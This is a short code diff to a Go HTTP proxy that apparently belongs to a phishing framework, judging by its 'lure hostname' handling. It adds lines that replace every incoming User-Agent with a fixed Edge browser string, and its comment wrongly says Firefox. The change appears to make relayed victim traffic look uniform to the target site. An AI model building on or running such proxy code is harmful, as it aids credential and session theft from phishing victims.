@@ -529,7 +529,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-
+				
+				// Replace Any User Agent With Firefox UserAgent
+				useragent := req.Header.Get("User-Agent")
+				if useragent != "" {                                   
+							req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/118.0.2088.88")
+							log.Debug("[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/118.0.2088.88 ", ps.Index)
+				}
+				
 				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
 				if p.cfg.IsLureHostnameValid(req.Host) {
 					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)
